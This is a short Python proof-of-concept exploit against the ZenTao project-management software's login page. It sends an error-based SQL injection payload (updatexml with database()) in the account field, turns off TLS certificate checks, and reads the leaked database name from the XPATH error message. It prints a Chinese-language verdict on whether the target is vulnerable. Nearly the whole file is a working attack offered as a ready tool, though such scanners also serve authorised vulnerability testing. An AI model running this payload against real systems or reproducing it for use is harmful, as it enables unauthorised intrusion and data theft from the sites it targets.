#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/zentao/user-login.html"
    burp0_headers = {"Referer": site+"/zentao/user-login.html", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"account": "admin' and  updatexml(0x7e,concat(0x7e,database()),1) and '1'='1"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    #print(r.text)
    if "XPATH" in r.text:
        info = re.findall("'~([^']+)'", r.text)
        if len(info) != 0:
            return info[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 path 结果为：", info)
    else:
        print("[-]漏洞不存在")
